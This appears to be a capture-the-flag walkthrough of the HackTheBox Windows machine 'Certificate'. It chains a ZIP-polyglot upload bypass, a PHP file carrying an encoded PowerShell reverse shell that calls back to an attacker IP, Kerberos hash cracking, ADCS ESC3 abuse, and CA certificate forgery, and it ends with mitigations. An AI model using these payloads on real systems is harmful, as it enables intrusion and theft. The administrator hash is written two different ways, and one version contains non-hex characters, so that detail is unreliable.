---
layout: post
title: "HackTheBox - Certificate Walkthrough"
date: 2025-10-01
categories: Writeup
tags: xss file-upload-bypass zip-polyglot adcs esc3 certificate-request-agent kerberos-preauth pcap-analysis semanagevolumeprivilege certificate-forgery bcrypt-cracking evil-winrm certipy bloodhound
---



![Certificate Banner](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9b765f2f3e0b0c8d115b5455c22101cf.png)

## Machine Information

- **Name**: Certificate
- **Difficulty**: Hard
- **OS**: Windows / Active Directory
- **IP**: 10.10.11.71
- **Domain**: certificate.htb

## Synopsis

Certificate is a hard-difficulty Windows Active Directory machine that chains multiple advanced exploitation techniques. The attack path involves exploiting XSS in a web application, bypassing file upload restrictions using ZIP polyglots, extracting Kerberos pre-authentication hashes from PCAP files, abusing ADCS ESC3 certificate templates, and escalating privileges through SeManageVolumePrivilege to forge CA certificates for domain administrator access.

---

## Reconnaissance

### Nmap Scan

```bash
Export TARGET=10.10.11.71 
nmap -sCVT -v -A -p$(nmap -v -T5 -Pn -p- "$TARGET" | grep -E '^[0-9]+/tcp' | awk -F'/' '{print $1}' |paste -sd ',') "$TARGET" -oN certificate_nmap
```

**Open Ports:**
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

**Key findings:**
- Active Directory Domain Controller
- Web server running Apache with PHP
- WinRM enabled (port 5985)
- Domain: `certificate.htb`
- DC: `DC01.certificate.htb`

---

## Phase 1: Web Application Exploitation

### Technology Fingerprinting

```bash
whatweb http://certificate.htb
```

**Stack:**
- Apache 2.4.58 (Win64)
- PHP 8.0.30
- Bootstrap, jQuery
- OpenSSL 3.1.3

### Directory Enumeration

```bash
gobuster dir -u http://certificate.htb/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt \
  -t 100 -x php
```

**Discovered endpoints:**
```
/DB.php           - Empty response (database connection file)
/Index.php        - Main page
/Login.php        - Authentication
/register.php     - User registration
/upload.php       - Redirects to login (requires authentication)
/courses.php      - Requires authentication
/logout.php       - Session termination
/static/          - Static resources
```

### XSS Discovery

Registered user with username: `<script>alert("1")</script>`

Result: XSS payload executes on login page, confirming **Stored XSS** vulnerability.

### Upload Endpoint Analysis

Accessing `/upload.php` returns:
```
404 Not Found
No quizz found with the given SID.
```

Parameter fuzzing reveals the endpoint expects `s_id` (session/quiz ID):

```bash
gobuster fuzz -u "http://certificate.htb/upload.php?s_id=FUZZ" \
  -w 1-100.txt \
  -t 100 \
  -H "Cookie: PHPSESSID=ue6384fivhcr4ddv35gism94mf" | grep "Status=200"
```

Multiple quiz IDs (1-100) return status 200, providing file upload functionality.

---

## Phase 2: File Upload Bypass & Initial Access

### Upload Restriction Analysis

Direct PHP upload is blocked. The application validates file types and content.

### ZIP Polyglot Attack

Create a valid ZIP containing benign content, then append a malicious ZIP:

**Step 1: Create legitimate file**
```bash
echo "hi blackarch" > blackarch.pdf
zip blackarch.zip blackarch.pdf
```

**Step 2: Create reverse shell**
```bash
cat > shell.php << 'EOF'
<?php
shell_exec("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA5ADcAIgAsADEAMgAzADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA");
?>
EOF
```

**Step 3: Create polyglot**
```bash
# Place shell.php in my_files directory
mkdir my_files
mv shell.php my_files/
zip -r my_files.zip my_files/

# Concatenate ZIPs to create polyglot
cat blackarch.zip my_files.zip > ppolyglot.zip
```

**Step 4: Upload and trigger**
```bash
# Start listener
rlwrap nc -lvnp 1234

# Upload pepe.zip to any quiz (s_id=1-100)
# Access shell at:
# http://certificate.htb/static/uploads/<hash>/my_files/shell.php
```

**Shell obtained as:** `xamppuser`

---

## Phase 3: Database Enumeration & Credential Extraction

### Database Credentials

Reading `/xampp/htdocs/certificate.htb/db.php`:

```php
$dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
$db_user = 'certificate_webapp_user';
$db_passwd = 'cert!f!c@teDBPWD';
```

### User Enumeration

```powershell
C:\xampp\mysql\bin\mysql.exe -u 'certificate_webapp_user' \
  -p'cert!f!c@teDBPWD' \
  -e 'use certificate_webapp_db; select * from users;'
```

**Key users identified:**

| ID | Name | Username | Email | Role | Hash |
|----|------|----------|-------|------|------|
| 1 | Lorra Armessa | Lorra.AAA | lorra.aaa@certificate.htb | teacher | $2y$04$bZs2FUjVRiFswY84CUR8ve... |
| 10 | Sara Brawn | sara.b | sara.b@certificate.htb | **admin** | $2y$04$CgDe/Thzw/Em/M4SkmXNbu... |

### Password Cracking

```bash
hashcat -m 3200 -a 0 hash.txt \
  /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```

**Cracked:**
- `sara.b@certificate.htb` : `Blink182`

**Hash type:** bcrypt ($2y$) with cost factor 4 (very weak)

---

## Phase 4: Active Directory Enumeration

### Initial WinRM Access

```bash
evil-winrm -i 10.10.11.71 -u Sara.B -p 'Blink182'
```

### BloodHound Collection

```bash
bloodhound-python -dc DC01.certificate.htb \
  -u 'Sara.B' -p 'Blink182' \
  -d certificate.htb \
  -c All \
  -ns 10.10.11.71
```

**Note:** Clock skew warning indicates time synchronization issue with DC.

**Findings:**
- No immediate privilege escalation paths
- Sara.B has standard user privileges
- Need to find additional attack vectors

### PCAP File Discovery

Found network capture: `WS-01_PktMon.pcap`

---

## Phase 5: Kerberos Pre-Authentication Attack

### PCAP Analysis with NetworkMiner

Opening the PCAP in NetworkMiner reveals Kerberos traffic for user `Lion.SK`.

### Hash Extraction

```bash
# Convert PCAP to PDML format
tshark -r WS-01_PktMon.pcap -T pdml > sample.pdml

# Extract Kerberos hash
krb2john sample.pdml
```

**Extracted hash:**
```
Lion.SK:$krb5pa$18$Lion.SK$CERTIFICATE$$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

**Hash type:** Kerberos 5 etype 18 Pre-Authentication

### Hash Cracking

```bash
hashcat -m 19900 -a 0 hash3.txt /usr/share/wordlists/rockyou.txt
```

**Cracked:** `!QAZ2wsx`

**Credentials:**
- User: `Lion.SK`
- Password: `!QAZ2wsx`

### User Flag

```bash
evil-winrm -i 10.10.11.71 -u Lion.SK -p '!QAZ2wsx'
type C:\Users\Lion.SK\Desktop\user.txt
```

---

## Phase 6: ADCS ESC3 Certificate Template Abuse

### Certificate Template Enumeration

```bash
certipy find -u 'Lion.SK' -p '!QAZ2wsx' \
  -dc-ip 10.10.11.71 \
  -vulnerable \
  -stdout
```

**Vulnerable template discovered:**
```
Template Name: Delegated-CRA
Certificate Authorities: Certificate-LTD-CA
Enabled: True
Enrollment Agent: True
Extended Key Usage: Certificate Request Agent
Enrollment Rights: CERTIFICATE.HTB\Domain CRA Managers
Vulnerabilities: ESC3 - Template has Certificate Request Agent EKU set
```

**Key findings:**
- Lion.SK is member of `Domain CRA Managers`
- Template allows requesting certificates on behalf of other users
- ESC3 vulnerability enables privilege escalation

### ESC3 Attack Chain

**Reference:** [HackingArticles - ADCS ESC3](https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/)

**Step 1: Request Enrollment Agent Certificate**

```bash
certipy req -u 'Lion.SK' -p '!QAZ2wsx' \
  -dc-ip 10.10.11.71 \
  -ca Certificate-LTD-CA \
  -target 'DC01.certificate.htb' \
  -template 'Delegated-CRA'
```

**Output:** `lion.sk.pfx` (enrollment agent certificate)

**Step 2: Request Certificate On-Behalf-Of Ryan.K**

```bash
certipy req -u 'lion.sk@CERTIFICATE.HTB' \
  -p '!QAZ2wsx' \
  -dc-ip '10.10.11.71' \
  -target 'DC01.CERTIFICATE.HTB' \
  -ca 'Certificate-LTD-CA' \
  -template 'SignedUser' \
  -pfx 'lion.sk.pfx' \
  -on-behalf-of 'CERTIFICATE\ryan.k'
```

**Output:** `ryan.k.pfx`

**Step 3: Extract NT Hash**

```bash
certipy auth -pfx ryan.k.pfx -dc-ip 10.10.11.71
```

**Ryan.K credentials:**
```
Username: ryan.k@certificate.htb
NT Hash: b1bc3d70e70f4f36b1509a65ae1a2ae6
```

### Lateral Movement

```bash
evil-winrm -i 10.10.11.71 -u Ryan.K -H b1bc3d70e70f4f36b1509a65ae1a2ae6
```

---

## Phase 7: Privilege Escalation to Administrator

### Privilege Analysis

```powershell
whoami /priv
```

**Key privilege identified:**
```
SeManageVolumePrivilege    Perform volume maintenance tasks    Enabled
```

### SeManageVolumePrivilege Exploitation

**Vulnerability:** This privilege allows performing volume-level operations that can be abused to gain arbitrary write access to system directories.

**Reference:** [Medium - Active Directory Pentesting](https://motasemhamdan.medium.com/active-directory-pentesting-offensive-security-proving-grounds-access-writeup-ddf4f3c6fcb9)

**Exploit:** [SeManageVolumeExploit GitHub](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public)

**Step 1: Upload Exploit**

```powershell
curl http://10.10.14.197/SeManageVolumeExploit.exe -o SeManageVolumeExploit.exe
```

**Step 2: Execute Exploit**

```powershell
.\SeManageVolumeExploit.exe
```

**Result:**
```
Entries changed: 853
DONE
```

**Step 3: Verify Write Access**

```powershell
echo "certificate box" > C:\Windows\htb.txt
type C:\Windows\htb.txt
```

Success! We now have write access to `C:\Windows\`.

### Certificate Authority Private Key Export

With write access to `C:\Windows\`, we can export the CA certificate and private key:

```powershell
mkdir C:\temp
cd C:\temp

certutil -exportPFX my "Certificate-LTD-CA" C:\temp\ca.pfx
```

**Interactive prompts:**
- Enter password: (leave blank or set password)
- Confirm password

**Download certificate:**
```powershell
download ca.pfx
```

### Administrator Certificate Forgery

**Step 1: Forge Administrator Certificate**

```bash
certipy forge -ca-pfx ca.pfx \
  -upn 'administrator@certificate.htb' \
  -out forged_admin.pfx
```

**Step 2: Extract Administrator Hash**

```bash
certipy auth -dc-ip '10.10.11.71' \
  -pfx 'forged_admin.pfx' \
  -username 'administrator' \
  -domain 'certificate.htb'
```

**Administrator credentials:**
```
Username: administrator@certificate.htb
NT Hash: d804304519fdgjtfy3c14cbf1c024408c6
```

### Root Flag

```bash
evil-winrm -i 10.10.11.71 -u Administrator -H d804304519bf0143c14cbf1c024408c6

type C:\Users\Administrator\Desktop\root.txt
```

---

## Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────┐
│                    ATTACK PROGRESSION                           │
└─────────────────────────────────────────────────────────────────┘

Web Enumeration → XSS Discovery → File Upload (s_id parameter)
        ↓
ZIP Polyglot Bypass → PHP Shell Upload → xamppuser Access
        ↓
Database Enumeration → Password Hashes → Sara.B (Blink182)
        ↓
PCAP Analysis → Kerberos Pre-Auth Hash → Lion.SK (!QAZ2wsx)
        ↓
ADCS Template Enum → ESC3 Vulnerability → Enrollment Agent Cert
        ↓
On-Behalf-Of Request → Ryan.K Certificate → Ryan.K Hash
        ↓
SeManageVolumePrivilege → C:\Windows Write Access
        ↓
CA Certificate Export → Certificate Forgery → Administrator Hash
        ↓
Domain Administrator Access → Root Flag
```

---

## Key Vulnerabilities & Mitigations

### 1. Stored XSS in Web Application

**Vulnerability:** No input sanitization on user registration

**Impact:** Session hijacking, cookie theft

**Mitigation:**
- Implement Content Security Policy (CSP)
- HTML encode all user-supplied input
- Use HTTPOnly and Secure flags on cookies

### 2. File Upload Bypass via ZIP Polyglot

**Vulnerability:** Insufficient file validation

**Impact:** Remote code execution

**Mitigation:**
- Validate file content, not just extension
- Use anti-malware scanning
- Execute uploads in sandboxed environment
- Implement strict MIME type checking

### 3. Weak Password Hashing

**Vulnerability:** Bcrypt with cost factor 4

**Impact:** Rapid password cracking

**Mitigation:**
- Increase bcrypt cost to minimum 12
- Implement rate limiting on login
- Use unique salts per password

### 4. Hardcoded Database Credentials

**Vulnerability:** Credentials in `db.php`

**Impact:** Full database access

**Mitigation:**
- Use environment variables
- Implement least-privilege database access
- Rotate credentials regularly

### 5. Exposed Network Captures

**Vulnerability:** PCAP file with Kerberos pre-auth

**Impact:** Offline password cracking

**Mitigation:**
- Secure network captures with proper ACLs
- Use strong Kerberos pre-authentication passwords
- Implement Kerberos armoring (FAST)

### 6. ADCS ESC3 Misconfiguration

**Vulnerability:** Certificate Request Agent template accessible

**Impact:** Impersonation of any domain user

**Mitigation:**
- Restrict enrollment agent templates
- Implement manager approval
- Audit certificate template permissions
- Remove unnecessary EKUs

### 7. SeManageVolumePrivilege Abuse

**Vulnerability:** Excessive privilege assignment

**Impact:** System directory write access

**Mitigation:**
- Follow principle of least privilege
- Restrict SeManageVolumePrivilege to administrators only
- Monitor privilege usage with logging

### 8. CA Private Key Exportable

**Vulnerability:** CA certificate private key can be exported

**Impact:** Complete domain compromise via certificate forgery

**Mitigation:**
- Use Hardware Security Module (HSM) for CA keys
- Mark CA private keys as non-exportable
- Implement strong physical and logical security
- Enable CA auditing and monitoring

---

## Tools Used

- **nmapautomator** - Automated port scanning
- **gobuster** - Directory and parameter fuzzing
- **evil-winrm** - Windows Remote Management client
- **hashcat** - Password hash cracking
- **certipy-ad** - ADCS abuse and certificate operations
- **bloodhound-python** - Active Directory enumeration
- **tshark/krb2john** - Kerberos hash extraction from PCAP
- **NetworkMiner** - Network traffic analysis

---

## Timeline

1. **Web Enumeration** - Discovered upload endpoint with parameter fuzzing
2. **XSS Discovery** - Stored XSS in registration form
3. **File Upload Bypass** - ZIP polyglot technique for PHP shell
4. **Database Access** - Extracted credentials from `db.php`
5. **Password Cracking** - Obtained Sara.B access
6. **PCAP Analysis** - Extracted Lion.SK Kerberos hash
7. **User Flag** - Accessed as Lion.SK
8. **ADCS ESC3** - Abused certificate template for lateral movement
9. **Privilege Enumeration** - Identified SeManageVolumePrivilege
10. **CA Certificate Theft** - Exported CA private key
11. **Certificate Forgery** - Generated Administrator certificate
12. **Root Flag** - Achieved Domain Admin access

---

## Lessons Learned

1. **Defense in Depth** - Multiple vulnerabilities were chained; a single fix would have prevented the attack
2. **ADCS Security** - Certificate templates require careful configuration
3. **Privilege Management** - Excessive Windows privileges enable powerful attacks
4. **Network Monitoring** - PCAP files should be treated as sensitive data
5. **Input Validation** - All user input must be validated, including file uploads
6. **Credential Hygiene** - Strong passwords and secure storage are critical

---

**Disclaimer:** This writeup is for educational purposes only. Perform penetration testing only on systems you own or have explicit permission to test.


*Date: October 2025*